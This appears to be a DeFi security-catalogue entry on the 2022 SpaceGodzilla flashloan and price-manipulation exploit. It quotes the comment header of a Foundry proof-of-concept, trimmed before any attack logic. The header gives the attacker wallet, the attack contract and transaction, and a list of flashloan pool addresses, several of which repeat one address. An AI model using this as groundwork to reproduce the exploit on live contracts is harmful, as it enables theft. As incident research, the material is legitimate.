# [?] SpaceGodzilla - Flashloans & Price Manipulation

## Summary
Severity: Unknown
Chain: BNB Chain
Component: SpaceGodzilla
Published: 2022-07-13
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-07/SpaceGodzilla_exp.sol
Type: defi-exploit-poc

## Details
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

/* @KeyInfo - Total Lost : 25,378 BUSD
    Attacker Wallet : https://bscscan.com/address/0x00a62eb08868ec6feb23465f61aa963b89e57e57
    Attack Contract : https://bscscan.com/address/0x3d817ea746edd02c088c4df47c0ece0bd28dcd72
    SpaceGodzilla : https://bscscan.com/address/0x2287c04a15bb11ad1358ba5702c1c95e2d13a5e0
    Attack Tx : https://bscscan.com/tx/0x7f183df11f1a0225b5eb5bb2296b5dc51c0f3570e8cc15f0754de8e6f8b4cca4*/

/* @News
    BlockSec : https://mobile.twitter.com/BlockSecTeam/status/1547456591900749824
    PANews : https://www.panewslab.com/zh_hk/articledetails/u25j5p3kdvu9.html*/

/* @Reports
    Numen Cyber Labs : https://medium.com/numen-cyber-labs/spacegodzilla-attack-event-analysis-d29a061b17e1
    Learnblockchain.cn Analysis : https://learnblockchain.cn/article/4396
    Learnblockchain.cn Analysis : https://learnblockchain.cn/article/4395*/

/*  We skipped the part where the attacker made a flashloan with 16 pools to get the initial capital
Here are the pools that attacker borrowed:
address constant pool1 = 0x203e062964500808151E069Eda017097E510B710;    // BUSD/GERA Pool
address constant pool2 = 0x535Ae122657E5F17FB03540A98BF9F494a06e2A4;    // BUSD/BABBC Pool
address constant pool3 = 0xa91E7d767FFdbFF64a955f32E8E3F08AfaB3047b;    // WBNB/Fei Pool
address constant pool4 = 0x0e15e47C3DE9CD92379703cf18251a2D13E155A7;    // DBTC/USDT Pool
address constant pool5 = 0x409E377A7AfFB1FD3369cfc24880aD58895D1dD9;    // TUF/USDT Pool
address constant pool6 = 0x8A1C25e382B80E7860DB1ae619E1Fc92a0cd7104;    // FREY/USDT Pool
address constant pool7 = 0x409E377A7AfFB1FD3369cfc24880aD58895D1dD9;    // Leek/USDT Pool
address constant pool8 = 0x409E377A7AfFB1FD3369cfc24880aD58895D1dD9;    // CC/BUSD Pool
address constant pool9 = 0x409E377A7AfFB1FD3369cfc24880aD58895D1dD9;    // ASET/USDT Pool
address constant pool10 = 0xb19265426ce5bC1E015C0c503dFe6EF7c407a406;   // USX/BUSD Pool
address constant pool11 = 0xe3C58d202D4047Ba227e437b79871d51982deEb7;   // BTCB/BUSD Pool   DSPFlashLoanCall
address constant pool12 = 0x9BA8966B706c905E594AcbB946Ad5e29509f45EB;   // ETH/BUSD Pool    DPPFlashLoanCall
address constant pool13 = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;   // WBNB/USDT Pool   DPPFlashLoanCall
address constant pool14 = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;   // WBNB/BUSD Pool   DPPFlashLoanCall
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-07/SpaceGodzilla_exp.sol_
